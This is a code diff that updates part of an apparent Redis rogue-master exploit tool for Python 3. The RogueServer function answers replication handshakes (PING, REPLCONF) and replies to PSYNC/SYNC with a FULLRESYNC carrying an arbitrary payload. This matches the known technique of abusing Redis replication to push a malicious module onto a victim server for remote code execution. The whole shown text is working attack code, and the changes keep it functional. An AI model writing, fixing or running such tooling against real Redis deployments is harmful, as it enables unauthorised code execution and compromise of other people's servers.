@@ -41,20 +41,20 @@ def RogueServer(lport):
     
     while flag:
         data = clientSock.recv(1024)
-        if "PING" in data:
+        if b"PING" in data:
             result="+PONG"+CRLF
-            clientSock.send(result)
+            clientSock.send(result.encode())
             flag=True
-        elif "REPLCONF" in data:
+        elif b"REPLCONF" in data:
             result="+OK"+CRLF
-            clientSock.send(result)
+            clientSock.send(result.encode())
             flag=True
-        elif "PSYNC" in data or "SYNC" in data:
+        elif b"PSYNC" in data or b"SYNC" in data:
             result = "+FULLRESYNC " + "a" * 40 + " 1" + CRLF
             result += "$" + str(len(payload)) + CRLF
             result = result.encode()
             result += payload
-            result += CRLF
+            result += CRLF.encode()
             clientSock.send(result)
             print("\033[92m[+]\033[0m FULLRESYNC ...")
             flag=False
